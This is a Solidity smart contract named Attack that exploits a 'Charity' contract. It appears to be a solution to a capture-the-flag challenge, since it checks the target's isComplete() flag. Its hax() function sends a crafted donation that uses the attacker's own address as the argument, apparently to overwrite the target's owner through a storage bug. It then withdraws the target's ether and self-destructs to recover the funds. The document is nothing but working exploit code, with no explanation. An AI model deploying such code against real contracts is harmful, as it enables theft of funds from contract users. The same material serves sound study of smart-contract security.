pragma solidity ^0.4.21;

interface Charity {
    function donate(uint256) external payable;
    function withdraw() external;
    function isComplete() external view returns (bool);
}

contract Attack {
    Charity public target;
    address public owner;
    
    function Attack(address _target) public payable {
        require(msg.value == 1 ether);
        
        target = Charity(_target);
        owner = msg.sender;
    }
    
    function hax() public {
        require(owner == msg.sender);

        uint256 scale = 10 ** 36;
        uint256 donation = uint256(address(this))/scale;
        
        target.donate.value(donation)(uint256(address(this)));
        target.withdraw();
        require(target.isComplete());
    }
    
    function clean() public {
        require(owner == msg.sender);
        
        selfdestruct(owner);
    }
    
    function() external payable {}
}
